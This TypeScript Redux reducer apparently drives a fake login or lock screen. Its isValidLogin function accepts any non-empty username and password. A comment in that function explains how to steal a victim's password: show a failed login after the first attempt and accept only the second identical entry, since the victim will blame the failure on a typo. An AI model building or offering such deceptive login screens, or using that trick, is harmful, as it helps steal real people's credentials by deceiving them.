import * as Actions from './actions';
import * as C from './constants';
import { ReduxState, fallbackState } from './store';

function isValidLogin(username: string, password: string): boolean {
  // Modify this function to match your usecase
  // Idea: If you want to steal someones password only return true after (s)he has input the same credentials twice
  // That way you will get no typos. The victim will likely blame the one login error on a typo
  if (username && password){
    // You can check for specific credentials like this:
    if (username === "root" && password === "toor"){
      console.log("Old kali default credentials");
      return true;
    }
    return true;
  }
  return false;
}

export function reducer(state: ReduxState | undefined, action: Actions.Action): ReduxState {
  if (!state) {
    console.warn("No state was supplied to reducer. Falling back to default values");
    state = fallbackState;
  }

  switch (action.type) {
    case C.SET_LOGIN_USERNAME: {
      let payload = (action as Actions.SetStringAction).payload;
      return {
        ...state,
        login: {
          ...state.login,
          username: payload,
        },
      };
    }
    case C.SET_LOGIN_PASSWORD: {
      let payload = (action as Actions.SetStringAction).payload;
      return {
        ...state,
        login: {
          ...state.login,
          password: payload,
        },
      };
    }
    case C.TRY_LOGIN: {
      let success = isValidLogin(state.login.username, state.login.password);
      return {
        ...state,
        login: {
          ...state.login,
          failed: !success,
          count: state.login.count + 1,
        },
        isFinished: success,
      };
    }
    case C.SET_LOGIN_OPEN_MENU: {
      let payload = (action as Actions.OptionalStringAction).payload;
      return {
        ...state,
        login: {
          ...state.login,
          openMenu: payload,
        },
      };
    }
    case C.SET_SCREEN: {
      let newScreen = (action as Actions.SetStringAction).payload;
      let oldScreen = state.screen.name;

      let newState = {
        ...state,
        screen: {
          name: newScreen,
          changeTime: new Date(),
        },
      };

      if (newScreen === C.SCREEN_SUSPEND) {
        newState.suspend = {
          ...newState.suspend,
          lastScreen: state.screen.name,
        };
      }

      if (oldScreen === C.SCREEN_SUSPEND) {
        newState.suspend = {
          ...newState.suspend,
          lastScreen: undefined,
        };
      }
      return newState;
    }
  }
  return state;
}

export default reducer;
